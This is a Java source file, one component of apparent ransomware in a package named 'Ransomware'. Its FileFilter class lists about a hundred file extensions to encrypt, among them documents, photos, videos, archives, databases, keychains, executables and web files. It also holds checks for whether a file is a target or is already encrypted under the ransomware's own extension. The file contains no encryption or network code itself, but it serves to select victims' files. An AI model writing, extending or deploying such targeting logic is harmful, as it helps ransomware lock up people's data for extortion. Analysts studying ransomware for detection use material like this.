package Ransomware;

import java.io.File;
import java.util.ArrayList;

public class FileFilter {
    private final String ext;
    private final ArrayList<String> extensionsFileToEncrypt;

    public FileFilter(String ext){
        this.ext = ext;
        this.extensionsFileToEncrypt = new ArrayList<>();
        extensionsFileToEncrypt.add("txt");
        extensionsFileToEncrypt.add("pdf");
        extensionsFileToEncrypt.add("doc");
        extensionsFileToEncrypt.add("docx");
        extensionsFileToEncrypt.add("log");
        extensionsFileToEncrypt.add("msg");
        extensionsFileToEncrypt.add("odt");
        extensionsFileToEncrypt.add("pages");
        extensionsFileToEncrypt.add("rtf");
        extensionsFileToEncrypt.add("tex");
        extensionsFileToEncrypt.add("wpd");
        extensionsFileToEncrypt.add("hwp");
        extensionsFileToEncrypt.add("csv");
        extensionsFileToEncrypt.add("dat");
        extensionsFileToEncrypt.add("gbr");
        extensionsFileToEncrypt.add("ged");
        extensionsFileToEncrypt.add("key");
        extensionsFileToEncrypt.add("keychain");
        extensionsFileToEncrypt.add("pps");
        extensionsFileToEncrypt.add("ppt");
        extensionsFileToEncrypt.add("pptx");
        extensionsFileToEncrypt.add("sdf");
        extensionsFileToEncrypt.add("tar");
        extensionsFileToEncrypt.add("vcf");
        extensionsFileToEncrypt.add("xml");
        extensionsFileToEncrypt.add("alf");
        extensionsFileToEncrypt.add("iff");
        extensionsFileToEncrypt.add("m3u");
        extensionsFileToEncrypt.add("m4a");
        extensionsFileToEncrypt.add("mid");
        extensionsFileToEncrypt.add("mp3");
        extensionsFileToEncrypt.add("mpa");
        extensionsFileToEncrypt.add("ra");
        extensionsFileToEncrypt.add("wav");
        extensionsFileToEncrypt.add("wma");
        extensionsFileToEncrypt.add("3g2");
        extensionsFileToEncrypt.add("3gp");
        extensionsFileToEncrypt.add("asf");
        extensionsFileToEncrypt.add("asx");
        extensionsFileToEncrypt.add("avi");
        extensionsFileToEncrypt.add("flv");
        extensionsFileToEncrypt.add("m4v");
        extensionsFileToEncrypt.add("mov");
        extensionsFileToEncrypt.add("mp4");
        extensionsFileToEncrypt.add("mpg");
        extensionsFileToEncrypt.add("rm");
        extensionsFileToEncrypt.add("srt");
        extensionsFileToEncrypt.add("swf");
        extensionsFileToEncrypt.add("vob");
        extensionsFileToEncrypt.add("wmw");
        extensionsFileToEncrypt.add("3dm");
        extensionsFileToEncrypt.add("3ds");
        extensionsFileToEncrypt.add("max");
        extensionsFileToEncrypt.add("obj");
        extensionsFileToEncrypt.add("bmp");
        extensionsFileToEncrypt.add("dda");
        extensionsFileToEncrypt.add("gif");
        extensionsFileToEncrypt.add("jpg");
        extensionsFileToEncrypt.add("png");
        extensionsFileToEncrypt.add("psd");
        extensionsFileToEncrypt.add("pspimage");
        extensionsFileToEncrypt.add("tga");
        extensionsFileToEncrypt.add("thm");
        extensionsFileToEncrypt.add("tif");
        extensionsFileToEncrypt.add("tiff");
        extensionsFileToEncrypt.add("yuv");
        extensionsFileToEncrypt.add("ai");
        extensionsFileToEncrypt.add("eps");
        extensionsFileToEncrypt.add("ps");
        extensionsFileToEncrypt.add("svg");
        extensionsFileToEncrypt.add("indd");
        extensionsFileToEncrypt.add("pct");
        extensionsFileToEncrypt.add("xlr");
        extensionsFileToEncrypt.add("xls");
        extensionsFileToEncrypt.add("xlsx");
        extensionsFileToEncrypt.add("7z");
        extensionsFileToEncrypt.add("rar");
        extensionsFileToEncrypt.add("zip");
        extensionsFileToEncrypt.add("tar.gz");
        extensionsFileToEncrypt.add("apk");
        extensionsFileToEncrypt.add("app");
        extensionsFileToEncrypt.add("com");
        extensionsFileToEncrypt.add("exe");
        extensionsFileToEncrypt.add("asp");
        extensionsFileToEncrypt.add("apsx");
        extensionsFileToEncrypt.add("css");
        extensionsFileToEncrypt.add("htm");
        extensionsFileToEncrypt.add("html");
        extensionsFileToEncrypt.add("js");
        extensionsFileToEncrypt.add("jsp");
        extensionsFileToEncrypt.add("php");
        extensionsFileToEncrypt.add("xhtml");
        extensionsFileToEncrypt.add("fnt");
        extensionsFileToEncrypt.add("font");
        extensionsFileToEncrypt.add("oft");
        extensionsFileToEncrypt.add("ttf");
        extensionsFileToEncrypt.add("crdownload");
        extensionsFileToEncrypt.add("ics");
        extensionsFileToEncrypt.add("msi");
        extensionsFileToEncrypt.add("part");
        extensionsFileToEncrypt.add("torrent");
    }
    private String getExtension(File file){ return file.getName().substring(file.getName().lastIndexOf(".")+1); }
    public boolean isEncrypted(File file){ return getExtension(file).equals(ext); }
    public boolean isAEncryptableFile(File file){return extensionsFileToEncrypt.contains(getExtension(file));
    }
}
